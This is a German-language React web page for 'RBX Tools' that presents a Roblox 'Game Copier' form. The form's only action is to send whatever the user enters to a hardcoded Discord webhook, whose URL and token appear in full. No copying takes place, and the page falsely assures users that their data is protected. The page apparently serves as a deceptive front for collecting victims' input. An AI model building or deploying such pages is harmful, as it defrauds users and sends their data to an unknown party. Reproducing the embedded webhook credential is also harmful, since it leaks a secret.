import React, { useState } from 'react';
import { Copy, CheckCircle, AlertCircle, Menu, X } from 'lucide-react';

export default function App() {
  const [gameId, setGameId] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });
  const [menuOpen, setMenuOpen] = useState(false);

  const handleSubmit = async () => {
    if (!gameId.trim()) {
      setMessage({ type: 'error', text: 'Bitte gib eine Game-ID ein!' });
      return;
    }

    setIsLoading(true);
    setMessage({ type: '', text: '' });

    try {
      const webhookUrl = 'https://discord.com/api/webhooks/1439256970715725957/I9XBEgk59_ZG2GXpfHglmHAkPsBLP6MO4d02OqEYEi29LOtFzslMH4G2hl8kdvDnsYjA';
      
      const payload = {
        content: "Neue Game Copier Einsendung:",
        embeds: [
          {
            title: "Game Copier Input",
            description: gameId,
            color: 5814783
          }
        ]
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        setMessage({ type: 'success', text: 'Game erfolgreich gesendet! ✓' });
        setGameId('');
      } else {
        throw new Error('Webhook-Anfrage fehlgeschlagen');
      }
    } catch (error) {
      setMessage({ type: 'error', text: 'Fehler beim Senden. Bitte versuche es erneut.' });
    } finally {
      setIsLoading(false);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter' && !isLoading) {
      handleSubmit();
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white">
      <header className="bg-slate-900/50 backdrop-blur-lg border-b border-purple-500/20 sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-gradient-to-br from-purple-500 to-pink-500 rounded-lg flex items-center justify-center">
                <Copy className="w-6 h-6" />
              </div>
              <h1 className="text-2xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                RBX Tools
              </h1>
            </div>
            
            <nav className="hidden md:flex gap-6">
              <a href="#home" className="hover:text-purple-400 transition-colors">Home</a>
              <a href="#tools" className="hover:text-purple-400 transition-colors">Tools</a>
              <a href="#about" className="hover:text-purple-400 transition-colors">About</a>
            </nav>

            <button 
              onClick={() => setMenuOpen(!menuOpen)}
              className="md:hidden p-2 hover:bg-purple-500/20 rounded-lg transition-colors"
            >
              {menuOpen ? <X /> : <Menu />}
            </button>
          </div>

          {menuOpen && (
            <nav className="md:hidden mt-4 pb-4 flex flex-col gap-3 border-t border-purple-500/20 pt-4">
              <a href="#home" className="hover:text-purple-400 transition-colors">Home</a>
              <a href="#tools" className="hover:text-purple-400 transition-colors">Tools</a>
              <a href="#about" className="hover:text-purple-400 transition-colors">About</a>
            </nav>
          )}
        </div>
      </header>

      <section id="home" className="container mx-auto px-4 py-20 text-center">
        <div className="max-w-3xl mx-auto">
          <h2 className="text-5xl md:text-6xl font-bold mb-6 bg-gradient-to-r from-purple-400 via-pink-400 to-purple-400 bg-clip-text text-transparent animate-pulse">
            Willkommen bei RBX Tools
          </h2>
          <p className="text-xl text-gray-300 mb-8">
            Deine zentrale Plattform für leistungsstarke Roblox-Tools
          </p>
          <a 
            href="#tools"
            className="inline-block bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 px-8 py-4 rounded-lg font-semibold transition-all transform hover:scale-105 shadow-lg shadow-purple-500/50"
          >
            Zu den Tools
          </a>
        </div>
      </section>

      <section id="tools" className="container mx-auto px-4 py-16">
        <div className="max-w-2xl mx-auto">
          <div className="bg-slate-800/50 backdrop-blur-lg rounded-2xl p-8 border border-purple-500/20 shadow-2xl shadow-purple-500/10">
            <div className="flex items-center gap-3 mb-6">
              <Copy className="w-8 h-8 text-purple-400" />
              <h3 className="text-3xl font-bold">Game Copier</h3>
            </div>
            
            <p className="text-gray-300 mb-6">
              Gib die Game-ID oder einen Text ein, um das Spiel zu kopieren.
            </p>

            <div className="space-y-6">
              <div>
                <label htmlFor="gameId" className="block text-sm font-medium mb-2 text-gray-300">
                  Game-ID / Text
                </label>
                <input
                  type="text"
                  id="gameId"
                  value={gameId}
                  onChange={(e) => setGameId(e.target.value)}
                  onKeyPress={handleKeyPress}
                  placeholder="z.B. 123456789 oder beliebiger Text..."
                  className="w-full px-4 py-3 bg-slate-900/50 border border-purple-500/30 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-white placeholder-gray-500"
                  disabled={isLoading}
                />
              </div>

              {message.text && (
                <div className={`flex items-center gap-3 p-4 rounded-lg ${
                  message.type === 'success' 
                    ? 'bg-green-500/20 border border-green-500/30 text-green-300' 
                    : 'bg-red-500/20 border border-red-500/30 text-red-300'
                }`}>
                  {message.type === 'success' ? (
                    <CheckCircle className="w-5 h-5 flex-shrink-0" />
                  ) : (
                    <AlertCircle className="w-5 h-5 flex-shrink-0" />
                  )}
                  <span>{message.text}</span>
                </div>
              )}

              <button
                onClick={handleSubmit}
                disabled={isLoading}
                className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed px-6 py-4 rounded-lg font-semibold transition-all transform hover:scale-105 disabled:hover:scale-100 shadow-lg shadow-purple-500/30 flex items-center justify-center gap-2"
              >
                {isLoading ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Sende...
                  </>
                ) : (
                  <>
                    <Copy className="w-5 h-5" />
                    Game kopieren
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </section>

      <section className="container mx-auto px-4 py-16">
        <div className="max-w-5xl mx-auto">
          <h3 className="text-3xl font-bold text-center mb-12">Features</h3>
          <div className="grid md:grid-cols-3 gap-8">
            {[
              { title: 'Schnell', desc: 'Blitzschnelle Verarbeitung deiner Anfragen' },
              { title: 'Sicher', desc: 'Deine Daten sind bei uns geschützt' },
              { title: 'Einfach', desc: 'Intuitive Bedienung ohne Komplikationen' }
            ].map((feature, i) => (
              <div key={i} className="bg-slate-800/30 backdrop-blur-lg p-6 rounded-xl border border-purple-500/20 hover:border-purple-500/40 transition-all">
                <h4 className="text-xl font-bold mb-3 text-purple-400">{feature.title}</h4>
                <p className="text-gray-300">{feature.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      <footer id="about" className="bg-slate-900/50 backdrop-blur-lg border-t border-purple-500/20 mt-20">
        <div className="container mx-auto px-4 py-8">
          <div className="text-center">
            <p className="text-gray-400 mb-2">© 2024 RBX Tools. Alle Rechte vorbehalten.</p>
            <p className="text-sm text-gray-500">Erstellt mit React & TailwindCSS</p>
          </div>
        </div>
      </footer>
    </div>
  );
}